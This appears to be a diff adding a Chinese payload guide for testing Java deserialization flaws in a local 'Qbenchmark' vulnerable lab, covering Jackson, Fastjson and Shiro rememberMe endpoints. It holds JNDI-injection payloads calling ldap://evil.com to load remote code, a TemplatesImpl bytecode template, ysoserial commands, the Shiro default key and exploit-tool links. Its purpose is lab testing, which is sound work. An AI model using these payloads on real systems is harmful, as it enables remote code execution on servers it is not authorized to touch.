@@ -1,0 +1,131 @@
+# Java 反序列化漏洞测试 Payload
+# 用于验证 Qbenchmark 靶场中的反序列化漏洞
+
+## 1. Jackson 反序列化 Payload
+
+### 端点
+POST http://localhost:8080/deserialize/jackson
+
+### Payload 示例
+
+# JNDI 注入 (需要外部 LDAP 服务器)
+["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com:1389/exp"}]
+
+# 测试命令
+curl -X POST http://localhost:8080/deserialize/jackson \
+  -H "Content-Type: application/json" \
+  -d '["org.jsecurity.realm.jndi.JndiRealmFactory", {"jndiNames":"ldap://evil.com:1389/exp"}]'
+
+---
+
+## 2. Fastjson 反序列化 Payload
+
+### 端点
+POST http://localhost:8080/fastjson/deserialize
+
+### Payload 示例
+
+# TemplatesImpl 字节码注入 (需要恶意字节码)
+{
+  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+  "_bytecodes": ["base64编码的恶意字节码"],
+  "_name": "lightless",
+  "_tfactory": {},
+  "_outputProperties": {}
+}
+
+# JdbcRowSetImpl JNDI 注入
+{
+  "@type": "com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName": "ldap://evil.com:1389/exp",
+  "autoCommit": true
+}
+
+# 测试命令
+curl -X POST http://localhost:8080/fastjson/deserialize \
+  -H "Content-Type: application/json" \
+  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com:1389/exp","autoCommit":true}'
+
+---
+
+## 3. Shiro rememberMe 反序列化 Payload
+
+### 端点
+GET http://localhost:8080/shiro/deserialize
+
+### 生成 Payload
+
+# 使用 ysoserial 生成 payload
+java -jar ysoserial.jar CommonsCollections5 "calc.exe" > payload.ser
+
+# 加密 payload (使用 Shiro 默认密钥)
+# 使用工具: https://github.com/longofo/Shiro-550
+# 或: https://github.com/j1anFen/shiro_tool
+
+# 密钥 (Base64): kPH+bIxk5D2deZiIxcaaaA==
+# 密钥 (Hex): 4A766F6279436F646547656E6572617465644279417061636865436F6D6D6F6E73537472696E67754275696C646572
+
+### 测试命令
+curl http://localhost:8080/shiro/deserialize \
+  -H "Cookie: rememberMe=<加密后的Base64编码>"
+
+---
+
+## 4. Cookie 反序列化 Payload
+
+### 端点
+GET http://localhost:8080/deserialize/rememberMe/vuln
+
+### 生成 Payload
+
+# 使用 ysoserial 生成 payload 并 Base64 编码
+java -jar ysoserial.jar CommonsCollections5 "calc.exe" | base64
+
+### 测试命令
+curl http://localhost:8080/deserialize/rememberMe/vuln \
+  -H "Cookie: rememberMe=<Base64编码的payload>"
+
+---
+
+## 5. 验证脚本
+
+### 快速验证端点可访问性
+
+# Jackson 反序列化端点
+curl -X POST http://localhost:8080/deserialize/jackson \
+  -H "Content-Type: application/json" \
+  -d '{"test":"value"}'
+
+# Fastjson 反序列化端点
+curl -X POST http://localhost:8080/fastjson/deserialize \
+  -H "Content-Type: application/json" \
+  -d '{"name":"test","value":"123"}'
+
+# Shiro 反序列化端点
+curl http://localhost:8080/shiro/deserialize
+
+# Cookie 反序列化端点
+curl http://localhost:8080/deserialize/rememberMe/vuln
+
+---
+
+## 6. 工具下载
+
+### ysoserial
+https://github.com/frohoff/ysoserial/releases
+
+### Shiro 工具
+https://github.com/longofo/Shiro-550
+https://github.com/j1anFen/shiro_tool
+
+### JNDI 注入服务器
+https://github.com/welk1n/JNDI-Injection-Exploit
+
+---
+
+## 注意事项
+
+1. 这些 Payload 仅用于安全研究和教育目的
+2. 请在授权的环境中测试
+3. 部分攻击需要外部服务器（如 LDAP 服务器）
+4. Shiro 攻击需要使用特定工具进行 AES 加密
